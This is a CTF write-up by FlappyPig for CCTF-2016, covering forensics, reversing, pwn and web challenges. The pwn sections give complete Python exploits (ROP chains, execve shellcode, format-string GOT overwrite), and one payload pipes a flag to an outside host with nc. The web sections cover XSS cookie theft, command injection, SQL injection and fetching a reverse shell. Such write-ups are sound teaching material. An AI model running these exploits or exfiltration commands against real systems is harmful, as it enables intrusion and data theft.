# FlappyPig CCTF-2016 WriteUp

阅读量 **270130**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-04-26 09:27:59

 **x**

##### 译文声明

本文是翻译文章，文章来源：FlappyPig

译文仅供参考，具体内容表达以及含义原文为准。

作者：FlappyPig

Misc

签到

源码。

Misc1

Misc2

EZ Game Misc

在数据包中发现了大量smb流量,目测为smb的某洞,先找到getshell的流,流里面的好东西不少,这里不做赘述:

把这几个和每个前后的steam看下,一共就几个找到:

Base64解码得到flag。

猜CVE编号(补丁编号),其实我第一次试的就是08067(都不用看流第一个想到的就是这个吧==)。

True or False Misc

Down下来丢到Winhex里看一下,

尝试加了各种压缩文件头都不行,后来主办方出了提示说bz2,把头改成42 5a 68 39 之后可以正常解压,发现true 和 false
两个bin文件,直接运行的话会弹一个误导提示。

丢给二进制队友,静态调试在true中print_f中发现关键点,最终得到Flag

Best_Easy_Misc

这个题有些蛋疼.. 下载下来之后OS X直接解压了,跳过了不少坑.丢到Winhex里

最开始以为是摩尔斯密码,解了几下发现不对,队友说可能是培根密码,统计了一下有1024个字节,把—换成A 把 . 换成B
,感觉像是二维码的样子,变以32X32排列。(其实最后没看清我用别的符号替代了)

这时候发现有些东西藏在里面,就把每个点扩大了3倍,再缩小视图,拿PS勾图,得到Flag。

Forensic

神秘的文件1

这题一开始完全没思路,不知道level1是什么,file了一下:

去搜了一圈发现这个是windows的vhd格式,于是把他附加到电脑上:

发现分区被bitlocker保护了,但是不知道密码,后来发现了一个软件Passware Kit
Forensic可以破解Bitlocker密码,这时候知道给的mem.vmem内存dump文件怎么用了,加载进来破解:

跑了一会就出来恢复密钥了:

然后,直接输入恢复密钥就能打开磁盘获得level1的flag:

神秘的文件2

不出意外的话这题应该是搞level1里面获得的level2文件,本来一直没思路,后来看了提示可以用取证神器volatility,所以就下了一个,看了一圈发现内存里对level2的描述比较奇怪:

Volatility看了一下屏幕截图:

感觉是用TrueCrypt加密了某些东西?那么用truecryptsummary看一下内存dump:

这里看到truecryptsummary的结果显示level2是一个挂载在H盘的一个TrueCrypt
container,那么密码是多少呢?用truecryptmaster看了一下,的确找到了master key。

感觉应该是正确思路?

用这个masterkey解密level2就行了?

然后在这里被坑了很久,一直都没头绪,他说加密算法是CAST,但是这个非常老旧已经被弃用的算法啊。。我从github上down下来truecrypt的源码,自己写了一个CAST解密程序,可是解密出来完全不对啊,于是默默的被坑了很久后来看到了提示:

搞了半天level2密码不在内存了。我也是醉了。可是密码在其他地方,到底在哪里呢?一点思路都没有?

最后。最后我还是搞定了。我应该是唯一一个做出来的,紫鹏大神你要请我吃饭。最后我把题目描述页面上所有可见字符串都当密码试过了。最后的密码是purpleroc,紫鹏大神,给你跪下了。得到flag:

、

Bin

Re1

md5_custom函数啥都没干,所以Flag为CCTF{f2332291a6e1e6154f3cf4ad8b7504d8}。

Re2

C#混淆,用de4dot解混淆。发现将flag发送到端口31337,所以开个端口接收一下。

Re3

输入:numbers:789101112131415123456可以打印出: oh mon dieu t'as reussi bravo ! mdp est
concatene ordre est 4 2 3 1,所以flag为 CCTF{789101112131415123456}。

2048?4096?

2048游戏,玩死了之后会将 score-turn-time 发送到固定服务器,然后服务器发回do not cheat!

不知道服务器怎么check的,试了分最大的情况也不行。

根据提示3,知道需要求分最小的情况。

分最小情况如下:

2 4 2 4

4 2 4 2

2 4 2 4

4 2 4 2

得分为16,turn为(所有数之和-4)/2=20,然后时间最开始写10s发现不行,试了下100s,得到了flag。

difffffffffffuse

输入40字节,经过几千轮变换,然后与固定40字节比较。

发现每轮变换都是单字节操作,所以可以一个个字节去爆破。

用gdb脚本在strcmp处下断点记录不同字符串变换后的结果。然后逐个去匹配。得到flag为CCTF{1f_Y0u_W4nNa_R3vEn93_____purpleroc}

import os

for i in range(1, 0x100):

print i

f = open('abc.txt', 'wb')

f.write(chr(i)*40)

f.close()

command = 'gdb ./difuse -x difuse.py'

os.popen(command)

os.popen('cp ./out.txt ./result'+str(i)+'.txt')

dict ={}

for i in range(1, 0x100):

f = open('./result'+str(i)+'.txt', 'rb')

dict[i] = f.read()

f.close()

f = open('./biaozhun','rb')

biaozhun = f.read()

f.close()

result = ''

for i in range(len(biaozhun)):

for j in range(1, 0x100):

if dict[j][i] == biaozhun[i]:

result += chr(j)

print i

break

print result  
  
---  
  
Simple pwn

代码逻辑非常简单,如下:

返回之前,把三个地址解析的int值,分别放在栈顶和作为返回地址,如下:

由于读取东西后,直接将socket从标准输入输出关闭了,所以没法直接再次读取东西,所以泄露和改写没法同时进行,在次,利用两次,第一次泄露,第二次直接改写,由于32位的程序,空间有限,可以撞上。利用代码如下:

__author__ = "pxx"

from zio import *

from pwn import *

target = "./pwn1"

target = ("115.28.241.138", 9000)

#target = ("127.0.0.1", 2333)

elf_path = "./pwn1"

def get_io(target):

r_m = COLORED(RAW, "green")

w_m = COLORED(RAW, "blue")

io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)

return io

def get_elf_info(elf_path):

return ELF(elf_path)

def leak_addr(io):

#sample

main_addr = 0x0804852D

main_addr = 0x08048566

leave_ret = 0x08048498

p_ebp_ret = 0x0804866a

ppp_ret = 0x08048668

pppp_ret = 0x08048667

read_got = 0x0804a00c

read_plt = 0x080483b0

write_plt = 0x080483f0

atoi_got = 0x0804a024

setvbuf_plt = 0x08048400

stdout_got = 0x0804A040

io.read_until("welcome to cctfn")

#io.gdb_hint()

buffer_addr = 0x0804A060

rop_addr = buffer_addr + 30

ebp = rop_addr

v_1111 = str(leave_ret)

v_2222 = str(ebp)

v_3333 = str(p_ebp_ret)

#v_3333 = str(main_addr)

rop_chain = ""

rop_chain += l32(0x01010101)

rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(buffer_addr + 0x800)
+ l32(0x100)

rop_chain += l32(p_ebp_ret) + l32(buffer_addr + 0x800) + l32(leave_ret)

payload = ""

payload += v_1111 + "." + v_2222 + "." + v_3333 + "."

payload = payload.ljust(30, 'a')

payload += rop_chain

io.writeline(payload)

#io.interact()

#return

rop_chain = ""

rop_chain += l32(0x01010101)

#rop_chain += l32(setvbuf_plt) + l32(pppp_ret) + l32(stdout_got) + l32(0) +
l32(2) + l32(0)

#rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(read_got) + l32(12)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(read_got + 4)

payload = ""

payload += rop_chain

io.writeline(payload)

#io.interact()

data = io.read(4)

print [c for c in data]

read_addr = l32(data)

print "read_addr:", hex(read_addr)

#local

offset_system = 0x0003e800

offset_read = 0x000da8d0

offset_str_bin_sh = 0x15f9e4

#remote

"""

offset_read = 0x000dabd0

offset_system = 0x00040190

offset_str_bin_sh = 0x160a24

"""

#offset_read = int(raw_input("offset_read = "), 16)

#offset_system = int(raw_input("offset_system = "), 16)

libc_base = read_addr – offset_read

system_addr = libc_base + offset_system

bin_sh_addr = libc_base + offset_str_bin_sh

print "system_addr:", hex(system_addr)

print "bin_sh_addr:", hex(bin_sh_addr)

io.writeline(l32(system_addr) + "/bin/sh;")

io.interact()

import struct

def to_int(val):

return struct.unpack("i", struct.pack("I", val))[0]

def pwn(io):

#sample

main_addr = 0x0804852D

main_addr = 0x08048566

leave_ret = 0x08048498

p_ebp_ret = 0x0804866a

ppp_ret = 0x08048668

pppp_ret = 0x08048667

read_got = 0x0804a00c

read_plt = 0x080483b0

write_plt = 0x080483f0

atoi_got = 0x0804a024

setvbuf_plt = 0x08048400

stdout_got = 0x0804A040

io.read_until("welcome to cctfn")

#io.gdb_hint()

buffer_addr = 0x0804A060

rop_addr = buffer_addr + 40

ebp = rop_addr

v_1111 = str(leave_ret)

v_2222 = str(ebp)

v_3333 = str(p_ebp_ret)

#v_3333 = str(main_addr)

#local

real_read_addr = 0xf76e18d0

system_addr = 0xf7645800

bin_sh_addr = 0xf77669e4

#remote

#"""

real_read_addr = 0xb76babd0

system_addr = 0xb7620190

bin_sh_addr = 0xb7740a24

#"""

#print to_int(bin_sh_addr)

#print to_int(system_addr)

v_2222 = str(to_int(buffer_addr+40))

v_3333 = str(to_int(system_addr))

v_1111 = v_2222

rop_chain = ""

rop_chain += l32(0x01010101)

rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)

rop_chain += l32(system_addr) + l32(bin_sh_addr)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(buffer_addr + 0x800)
+ l32(0x100)

rop_chain += l32(p_ebp_ret) + l32(buffer_addr + 0x800) + l32(leave_ret)

payload = ""

payload += v_1111 + "." + v_2222 + "." + v_3333 + "."

payload = payload.ljust(40, 'a')

payload += "cat flag | nc 120.27.114.63 8888;"

payload += rop_chain

io.writeline(payload)

#io.interact()

io.writeline("id")

data = io.read_until("n")

print data

if len(data) < 3:

io.close()

return

print "get it"

#io.interact()

data = io.read(4)

print [c for c in data]

read_addr = l32(data)

print "read_addr:", hex(read_addr)

if read_addr == real_read_addr:

print "get it"

raw_input(":")

#io.interact()

else:

io.close()

return

#io.interact()

#return

rop_chain = ""

rop_chain += l32(0x01010101)

#rop_chain += l32(setvbuf_plt) + l32(pppp_ret) + l32(stdout_got) + l32(0) +
l32(2) + l32(0)

#rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(read_got) + l32(12)

rop_chain += l32(read_plt) + l32(ppp_ret) + l32(read_got + 4)

payload = ""

payload += rop_chain

io.writeline(payload)

#io.interact()

#local

offset_system = 0x0003e800

offset_read = 0x000da8d0

offset_str_bin_sh = 0x15f9e4

#remote

"""

offset_read = 0x000dabd0

offset_system = 0x00040190

offset_str_bin_sh = 0x160a24

"""

#offset_read = int(raw_input("offset_read = "), 16)

#offset_system = int(raw_input("offset_system = "), 16)

libc_base = read_addr – offset_read

system_addr = libc_base + offset_system

bin_sh_addr = libc_base + offset_str_bin_sh

print "system_addr:", hex(system_addr)

print "bin_sh_addr:", hex(bin_sh_addr)

io.writeline(l32(system_addr) + "/bin/sh;")

io.interact()

"""

io = get_io(target)

leak_addr(io)

exit(0)

"""

while True:

try:

io = get_io(target)

pwn(io)

except Exception, e:

#raise e

Pass

接收flag,成功截图:

新大陆

代码逻辑非常简单,如下:

直接读取数据到尾部,然后将5字节拷贝至最前面,然后跳过去。

由于在call eax前后,栈只会压人一个返回地址eip,如下:

所以栈相对于main函数只会偏移四个字节,如果直接返回到如下截图处,此时eax值也为map出来的地址,那么就可以往buff的最前面写入数据,但是由于栈有偏移,此时应该利用这5字节代码做这些事情,调整栈,跳转到如下位置:

由于call eax压人的返回地址与上述位置相差的就是一个字节,所以做起来相对比较容易,利用代码如下:

__author__ = "pxx"

from zio import *

from pwn import *

target = "./pwn2"

elf_path = "./pwn2"

target = ("120.27.130.77", 9000)

def get_io(target):

r_m = COLORED(RAW, "green")

w_m = COLORED(RAW, "blue")

io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)

return io

def get_elf_info(elf_path):

return ELF(elf_path)

def pwn(io):

#sample

elf_info = get_elf_info(elf_path)

context(arch = elf_info.arch, os = 'linux')

addr = 0x080484CF

code = "jmp 0x%x"%addr

#eip_addr = 0x080484F7

#elf_info.asm(eip_addr, code)

#data = elf_info.disasm(eip_addr, 10)

#print data

eip_addr = 0x31337000

offset = (0x80484cf – eip_addr – 5) & 0xffffffff

print hex(offset)

diff = 0x80484f9 – 0x080484Cf

code = ""

code += asm("pop ebx") #1

code += asm('mov bl, 0xcf') #2

#code += asm("push ebx") #1

code += asm("jmp ebx") #2

print diff

print len(asm("pop ebx"))

print len(asm('mov bl, 0xcf'))

print len(asm("jmp ebx"))

print len(code)

#code = "P" + "xe9" + l32(offset)

io.gdb_hint()

io.writeline(code)

shellcode =
"x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x89xc2xb0x0bx31xc9xcdx80"

asm_str = """

0: 31 c0 xor eax,eax

2: 50 push eax

3: 68 2f 2f 73 68 push 0x68732f2f

8: 68 2f 62 69 6e push 0x6e69622f

d: 89 e3 mov ebx,esp

f: 89 c2 mov edx,eax

11: b0 0b mov al,0xb

13: 31 c9 xor ecx,ecx

15: cd 80 int 0x80

"""

print disasm(shellcode)

code = ""

code += shellcode

code = code.ljust(4090, 'a')

code += shellcode[:5]

io.writeline(code)

io.interact()

io = get_io(target)

pwn(io)

成功截图:

Ftp_server

这道题应该是三个pwn中最简单的一道,就是个简单的格式化字符串,漏洞处如下:

格式化在栈上,利用代码如下:

__author__ = "pxx"

from zio import *

from pwn import *

target = "./pwn3"

elf_path = "./pwn3"

target = ("120.27.155.82", 9000)

def get_io(target):

r_m = COLORED(RAW, "green")

w_m = COLORED(RAW, "blue")

io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)

return io

def get_elf_info(elf_path):

return ELF(elf_path)

def put_file(io, name, content):

io.read_until("ftp>")

io.writeline("put")

io.read_until(":")

io.writeline(name)

io.read_until(":")

io.writeline(content)

def dir_file(io):

io.read_until("ftp>")

io.writeline("dir")

def get_file(io, name):

io.read_until("ftp>")

io.writeline("get")

io.read_until(":")

io.writeline(name)

def pwn(io):

#sample

#elf_info = get_elf_info(elf_path)

name = "sysbdmin"

io.read_until("Name (ftp.hacker.server:Rainism):")

io.writeline()

real_name = [chr(ord(c)-1) for c in name]

real_name = "".join(real_name)

io.writeline(real_name)

malloc_got = 0x0804a024

puts_got = 0x0804a028

name = "aaaa"

#content = "AAAA" + "B"*4 + "C"*4 + "%7$x."

content = l32(malloc_got) + "%7$s…."

put_file(io, name, content)

get_file(io, name)

data = io.read_until("….")

print [c for c in data]

malloc_addr = l32(data[4:8])

print "malloc_addr:", hex(malloc_addr)

#local

offset_malloc = 0x00076550

offset_system = 0x0003e800

#remote

offset_malloc = 0x000766b0

offset_system = 0x00040190

libc_base = malloc_addr – offset_malloc

system_addr = libc_base + offset_system

print "system_addr:", hex(system_addr)

addr_info = ""

padding_info = ""

system_addr_buff = l32(system_addr)

offset = 4*4

begin_index = 7

for i in range(4):

addr_info += l32(puts_got + i)

val = ord(system_addr_buff[i])

count = val – offset

if count <= 0:

count += 0x100

padding_info += "%%%dc"%count + "%%%d$hhn"%(begin_index + i)

offset = val

name = "/bin/sh;"

content = addr_info + padding_info

put_file(io, name, content)

io.gdb_hint()

get_file(io, name)

dir_file(io)

io.interact()

pass

io = get_io(target)

pwn(io)

成功截图:

AAAApk

Apk主要调用libverify.so中的sub_c9c进行check,但是这部分代码开始是被加过密的,所以首先需要简单解下密,解密部分在init中,如下:

解密完后,发现其实sub_c9c就是一个简单的异或处理,如下:

对输入进行base64解密后,与某个处理的串进行对比,正确就输出flag,此时都无需考虑输入,直接根据该串进行解密即可得到flag,其中解密代码和获取flag的代码如下:

__author__ = "pxx"

def decode_file():

file_r = open("libverify.so", "rb")

content = file_r.read()

file_r.close()

info = []

begin_pos = 0xC9D & 0xFFFFFFFE

for i in range(352):

info.append(chr((~ord(content[begin_pos+i]))&0xff))

print "".join(info)

file_w = open("libverify-decode.so", "wb")

content_new = content[:begin_pos] + "".join(info) +
content[begin_pos+len(info):]

file_w.write(content_new)

file_r.close()

def parse_something():

byte_4004 = [0x77, 8, 0x69, 0x4C, 0x7C, 0x6D, 0x4A, 0x7D, 0x66, 0x78, 0x62,
0x16, 0, 0, 0, 0]

byte_23f0 = [0xDE, 0xBF, 0xDC, 0xDB, 0xDA, 0xA1, 0xD9, 0xD5, 0xD7, 0xD6, 0xA0,
0xD4, 0]

for i in range(12):

byte_4004[i] ^= ((~byte_23f0[i])&0xff)

print byte_4004

print "".join([chr(c) for c in byte_4004])

byte_23FD = [0xC, 0x4B, 0x38, 0x19, 0x2C, 0x39, 0x15, 0x4D, 0x3E, 0x3E, 0x23,
0x6B, 0]

byte_23F0 = [0xDE, 0xBF, 0xDC, 0xDB, 0xDA, 0xA1, 0xD9, 0xD5, 0xD7, 0xD6, 0xA0,
0xD4, 0]

out_info = [ord(c) for c in "CCTF"]

for i in range(12):

out_info.append(byte_23FD[i] ^ byte_4004[i] ^ ((~byte_23f0[i])&0xff))

print "".join([chr(c) for c in out_info])

parse_something()

成功截图:

Help FBI

Bin中这道题有点麻烦,控制流混淆+字符串加密+反调试+静态编译+arm。所以看起来比较费力。由于比较繁琐,细节部分就不赘述了。

1.定位字符串解密函数为0x9b00函数

在关键位置打印log,获取控制流程。

最终得到解密函数实现如下,并将文件中的几个字符串处进行解密:

__author__ = "pxx"

def strlen(info):

index = 0

for item in info:

if item == 0:

return index

else:

index += 1

return index

def sub_a0d0(v1, v2):

#2, 12, 2

#3, 12, 3

return v1 % v2

def decode_9B00(info):

byte_1a022 = [0x98, 0x91, 0xCE, 0xB4, 0x8C, 0xBF, 0x92, 0xCF, 0x97, 0xAB,
0x86, 0xBD]

v14 = []

index = 0

byte_1a022_len = strlen(byte_1a022)

while index < byte_1a022_len:

v6 = byte_1a022[byte_1a022_len – index – 1]

v14.append(((~v6)&0x3f | v6 &0xc0) ^ 0xc0)

index += 1

v14.append(0)

index = 0

v11 = strlen(v14)

info_len = strlen(info)

v13 = []

while index < info_len:

v12 = sub_a0d0(index, v11)

v13.append(v14[v12] & (~info[index] & 0xff) | info[index] & (~v14[v12] &
0xff))

index += 1

v13 = "".join([chr(c) for c in v13])

print v13

return v13

#info = [0xB, 0x17, 0x27, 0xD, 0x42, 0x19, 0x60, 0x12, 0x25, 0x11, 7, 0x37,
0x2A, 0x16, 0x3A, 0xD, 0x63, 0x28, 0x60, 7, 0x24, 0x11, 0x1D, 0x13, 0x23, 0xB,
0x20, 0x49, 0]

#decode_9B00(info)

file_r = open("fbi", "rb")

content = file_r.read()

file_r.close()

def decode_pos(content, begin_pos):

cur_pos = begin_pos

info = []

while True:

if content[cur_pos] == "x00":

break;

info.append(ord(content[cur_pos]))

cur_pos += 1

info = decode_9B00(info)

return content[:begin_pos] + info + content[begin_pos + len(info):]

content = decode_pos(content, 0x11095) #Insert an iPhoneSE to start!

content = decode_pos(content, 0x11063) #Are you kidding me???

content = decode_pos(content, 0x110B2) #Connection is ok, Input your paSScode:

content = decode_pos(content, 0x1100D) #Try again

content = decode_pos(content, 0x11079) #Congratulation! Have a rest

content = decode_pos(content, 0x11000) #%s

content = decode_pos(content, 0x1102f) #/proc/%d/status

content = decode_pos(content, 0x11004) #iPhoneSE

content = decode_pos(content, 0x1103f) #ro.product.model

content = decode_pos(content, 0x11050) #/system/build.prop

content = decode_pos(content, 0x11017) #TracerPid:

decode_pos(content, 0xf198)

decode_pos(content, 0x10ff7)

#file_w = open("fbi-decode", "wb")

#file_w.write(content)

#file_w.close()

2.由于在运行是提示要insert iPhoneSE….才能继续下去,而且在后面直接跟个别的参数运行,直接输出are you kidding
me字符串。肯定因为输入的东西不匹配,于是在代码中找到对应位置,如下:

这里的v101必须要为0后面,才能起到作用,于是将函数sub_16f00给nop掉,并将r0的值赋值为0

3.成功后,会提示要输入passcode,根据附近的函数,猜测各个静态编译函数功能,代码如下:

4.然后进入主要的check过程。首先将一张大表进行初始化赋值,后续会按照这张表进行字符的置换,通过打印控制流的log信息,发现主要逻辑部分如下:

pos10

loop1:

pos7

pos5

pos1

goto loop1

pos7

pos5

pos7

pos4

loop2:

pos9

pos6

pos2

goto loop2

pos9

还原出逻辑代码如下:

def init_cryptto_table_96f0(v13, len_in):

index = 0

v13 = []

v8_table = [0x98, 0x91, 0xCE, 0xB4, 0x8C, 0xBF, 0x92, 0xCF, 0x97, 0xAB, 0x86,
0xBD]

while index < 256:

v13.append(index)

index += 1

v11 = 0

index = 0

index_i = 0

while True:

v14 = v13[index]

v4 = v8_table[index_i] – (-v11 – v14)

v11 = (v4 ^ 0xffffff00) & v4

#print index, v11

v13[index] = v13[v11]

v13[v11] = v14

index_i += 1

index += 1

if index_i >= len_in:

index_i = 0

if index >= 256:

break

#print [hex(c) for c in v13]

#raw_input(":")

return v13

5.逆向置换对比的部分与前面类似,也是根据控制流信息,还原代码如下:

def check_input(tmp_table, input_val):

index = 0

v25 = tmp_table[0]

v26 = tmp_table[1]

result_list = []

while index < len(input_val):

v25 = (v25 + 1) & 0xff

v29 = tmp_table[v25 + 2]

v26 = (v29 + v26) & 0xff

v30 = tmp_table[v26 + 2]

tmp_table[v25 + 2] = v30

tmp_table[v26 + 2] = v29

v31 = tmp_table[((-(-v29 – v30) ^ 0x3FFFFF00) & -(-v29 – v30)) + 2]

print index, "->", v31

result_list.append(v31)

v4 = (~input_val[index] & 0x8AA99332 | ((input_val[index] & 0xCD)&0xff)) ^
(~v31 & 0x32 | ((v31 & 0xCD)&0xff));

input_val[index] = v4

index += 1

tmp_table[0] = v25

tmp_table[1] = v26

#compare input_val with result_table

6.根据还原出来的代码逻辑发现, tmp_table的变化与输入没关系,只是自身的变化,所以可以根据结果来推算输入,代码如下:

target_list = [0x42, 0x10, 1, 0xFD, 0x52, 0xBC, 0x5C, 0x61, 0x1D, 0x76, 2,
0xA7, 0x52, 0x77, 0x52, 0x5E]

def decode_input_real(tmp_table, target_list):

index = 0

v25 = tmp_table[0]

v26 = tmp_table[1]

out_info = []

result_list = []

while index < len(target_list):

v25 = (v25 + 1) & 0xff

v29 = tmp_table[v25 + 2]

v26 = (v29 + v26) & 0xff

v30 = tmp_table[v26 + 2]

tmp_table[v25 + 2] = v30

tmp_table[v26 + 2] = v29

v31 = tmp_table[((-(-v29 – v30) ^ 0x3FFFFF00) & -(-v29 – v30)) + 2]

#print index, "->", v31

#result_list.append(v31)

mid_val = target_list[index] ^ (~v31 & 0x32 | ((v31 & 0xCD)&0xff))

print "index:", index

print "mid_val:", mid_val

for val in range(256):

#print ((~val & 0x8AA99332 | ((val & 0xCD)))&0xff)

if ((~val & 0x8AA99332 | ((val & 0xCD)))&0xff) == mid_val:

print "—–:", chr(val)

out_info.append(chr(val))

#v4 = (~input_val[index] & 0x8AA99332 | ((input_val[index] & 0xCD)&0xff)) ^
(~v31 & 0x32 | ((v31 & 0xCD)&0xff));

#input_val[index] = v4

index += 1

tmp_table[0] = v25

tmp_table[1] = v26

return out_info

byte_table = init_cryptto_table_96f0([], 12)

tmp_table = [0]*2 + byte_table

out_info = decode_input_real(tmp_table, target_list)

print out_info

print "".join(out_info)

成功截图如下:

验证如下:

Web

萝莉俱乐部-2

访问[www.loli.club](http://www.loli.xn--club-o84fui79bqa107exte7s3ejzqmgzea108az6tz30g/) 查看源代码可以看到一个邮箱:

在gayhub里搜这个邮箱可以找到源码:

点进去可以看到真实的blog地址。

把[https://github.com/PockyNya/pyprint](https://github.com/PockyNya/pyprint)
clone到本地,审计代码。

可以发现在AddPostHandler的post方法可以越权添加文章。

本地搭建测试一下,可以成功。

相同的数据包,发送到pocky.loli.club即可添加含有xss代码的文章。

然后访问[http://pocky.loli.club:41293/posts/clickme](http://pocky.loli.club:41293/posts/clickme)
测试成功。

根据提示,将这个url发到pocky@loli.club。

在xss平台就能接收到了。

将得到的flag从16进制转ascii即可看到明文:

萝莉俱乐部-1

从blog代码里还能看到有一个"日记"路径,访问可以看到:

点进去发现是403,查看代码发现:

如果服务器没有收到一个叫username的secure_cookie,则需要使用密码来访问这个页面.所以带着刚才xss打到的cookie访问即可看到内容:

可以看到一段lua代码,分析代码之后发现应该是通过telegram 进行控制,需要找命令执行的漏洞,代码中没有过虑分号,所以可以用分号进行命令注入。

注册一个telegram账号,根据提示与@PockyNyan建立会话,根据上面lua代码分析出来的规则,发送构造好的指令,即可得到flag:

萝莉俱乐部-3

扫描loli.club的子域名可以发现:

存在一个ns.loli.club,根据提示"用python和mysql开发的"猜测会有sqli漏洞:

测试发现确实存在,写一个中转脚本方便测试:

(不要在意代码里存在命令注入什么的啦..)

通过order by测试出表中有四个字段,

第二个字段是回显位.找表名,字段名什么的就不赘述了。

只有一个hosts表,四个字段分别是id,ip,domain,type,把ip数据查出来:

得到了一个内网IP:10.47.111.187,再把domain也查出来,发现对应的domain是: op-admin.in.loli.club
估计这个就是loli-4的入口了。

因为数据库中没有flag,所以想可能要用其他方法获得flag.试了好长时间之后发现,主办方在里面预留了一个udf后门,查询mysql.func可以看到函数名:

可以看到确实存在一个名为sYsT3m_e的函数,由于函数不带回显,所以将命令结果发送到vps接收,如:

bash直接反弹shell没成功,只好从vps上wget一个py反弹shell的脚本到目标机上运行,连上之后可以从目录找到flag:

萝莉俱乐部-4

在上一步中得到了一个IP: 10.47.111.187, 正好服务器中提供了nmap,果断的扫了一下端口:

发现存在两个web,一个80端口,一个8080端口,扔上去一个自己写的马,开启代理,然后本地挂代理访问,发现80端口什么都没有,8080端口是:

看提示的意思应该是需要用admin账号登录,网站ThinkPHP框架写的,本来以为不能有注入,不过还是手贱的试了一下,结果…

还真有注…果断扔到sqlmap里跑了一下:

得到密码,sha1解密之后是: iiaklis,登录拿到flag.

(p.s. 估计这题本意是让update修改密码,不过让我捡了个漏,不管那些了…拿到flag就好 2333333

本文翻译自FlappyPig [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **FlappyPig** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83818](/post/id/83818)

安全客 - 有思想的安全新媒体

本文转载自: [FlappyPig]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t01964e6fc92bf81882.jpg) FlappyPig

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

